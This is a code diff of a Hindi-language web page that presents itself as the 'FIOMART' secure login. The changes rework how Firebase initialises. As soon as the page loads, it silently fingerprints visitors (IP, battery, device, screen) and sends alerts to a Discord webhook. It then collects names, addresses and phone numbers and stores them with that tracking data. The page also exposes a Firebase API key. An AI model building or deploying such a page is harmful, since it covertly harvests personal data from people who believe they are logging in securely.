@@ -5,12 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FIOMART - सुरक्षित लॉगिन</title>
     
-    <!-- 1. बिल्कुल सही और फुल फायरबेस स्क्रिप्ट्स लिंक्स -->
+    <!-- 1. 100% स्टेबल और वर्किंग फायरबेस प्रोडक्शन स्क्रिप्ट्स (CDN Links) -->
     <script src="https://gstatic.com"></script>
     <script src="https://gstatic.com"></script>
     <script src="https://gstatic.com"></script>
     
-    <!-- गूगल फॉन्ट्स -->
+    <!-- प्रीमियम Google Fonts -->
     <link href="https://googleapis.com" rel="stylesheet">
 
     <style>
@@ -63,10 +63,8 @@
 </div>
 
 <script>
-    // 2. आपका पूरा और असली Discord Webhook URL यहाँ है
+    // आपका असली Discord Webhook URL और Firebase Config
     const discordWebhookUrl = "https://discord.com";
-    
-    // 3. आपकी बिल्कुल सही और फुल Firebase कॉन्फ़िगरेशन डिटेल्स
     const firebaseConfig = {
       apiKey: "AIzaSyA0PuCqJ8rCATKLwBYn1kJWjLj-ZvL-avY",
       authDomain: "fiomart-c6582.firebaseapp.com",
@@ -80,12 +78,23 @@
     let confirmationResultGlobal;
     let trackingData = { ip: "Fetching...", userAgent: navigator.userAgent, screenResolution: `${window.screen.width}x${window.screen.height}`, platform: navigator.platform, batteryLevel: "N/A", isCharging: "N/A" };
 
-    // सुरक्षित रूप से फायरबेस इनिशियलाइज करें
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-    window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container', { 'size': 'normal' });
+    // लाइब्रेरी लोड होने का इंतज़ार करने वाला सुरक्षित फंक्शन
+    function initApp() {
+        if (typeof firebase !== 'undefined') {
+            firebase.initializeApp(firebaseConfig);
+            window.db = firebase.firestore();
+            window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container', { 'size': 'normal' });
+            console.log("Firebase initialized successfully.");
+            
+            // फायरबेस लोड होने के बाद ही ट्रैकिंग ट्रिगर करें
+            startTracking();
+        } else {
+            console.log("Waiting for Firebase to load...");
+            setTimeout(initApp, 500); // 0.5 सेकंड बाद दोबारा कोशिश करें
+        }
+    }
 
-    // Discord पर अलर्ट भेजने का फंक्शन
+    // Discord Alert Sender
     function sendToDiscord(titleText) {
         fetch(discordWebhookUrl, {
             method: 'POST',
@@ -96,8 +105,8 @@
         }).catch(() => {});
     }
 
-    // पेज लोड होते ही ट्रैकिंग शुरू करें
-    window.onload = async function() {
+    // सुरक्षित ट्रैकिंग वर्कफ़्लो
+    async function startTracking() {
         if (navigator.getBattery) {
             try {
                 const battery = await navigator.getBattery();
@@ -113,9 +122,12 @@
             trackingData.ip = ipData.ip;
             sendToDiscord("🌐 **विजिटर का IP एड्रेस अपडेट:**");
         } catch (e) { trackingData.ip = "Unknown/Blocked"; }
-    };
+    }
 
-    // OTP बटन क्लिक लिसनर
+    // जैसे ही पेज लोड हो, इनिशियलाइजेशन शुरू करें
+    window.onload = initApp;
+
+    // OTP प्राप्त करें बटन क्लिक इवेंट listener
     document.getElementById('otpBtn').addEventListener('click', function() {
         const name = document.getElementById('userName').value;
         const address = document.getElementById('userAddress').value;
@@ -126,6 +138,11 @@
             return;
         }
 
+        if (typeof firebase === 'undefined' || !window.recaptchaVerifier) {
+            alert("सिस्टम अभी पूरी तरह लोड नहीं हुआ है, कृपया 2 सेकंड रुकें और दोबारा क्लिक करें।");
+            return;
+        }
+
         firebase.auth().signInWithPhoneNumber(phoneNumber, window.recaptchaVerifier)
             .then((confirmationResult) => {
                 confirmationResultGlobal = confirmationResult;
@@ -133,11 +150,11 @@
                 document.getElementById('phone-section').style.display = 'none';
                 document.getElementById('otp-section').style.display = 'block';
             }).catch((error) => {
-                alert("OTP भेजने में समस्या: " + error.message + "\nकृपया ध्यान दें कि नंबर के आगे +91 जरूर लगा हो।");
+                alert("OTP भेजने में समस्या: " + error.message + "\nकृपया नंबर से पहले +91 जांचें।");
             });
     });
 
-    // वेरिफाई बटन क्लिक लिसनर
+    // सत्यापित करें बटन क्लिक इवेंट listener
     document.getElementById('verifyBtn').addEventListener('click', function() {
         const code = document.getElementById('otpCode').value;
         const phoneNumber = document.getElementById('phoneNumber').value;
@@ -147,7 +164,7 @@
         confirmationResultGlobal.confirm(code).then((result) => {
             const user = result.user;
             try {
-                db.collection("registered_users").doc(user.uid).set({
+                window.db.collection("registered_users").doc(user.uid).set({
                     fullName: name, userAddress: address, phone: phoneNumber,
                     ipAddress: trackingData.ip, deviceOS: trackingData.platform,
                     resolution: trackingData.screenResolution, battery: trackingData.batteryLevel,
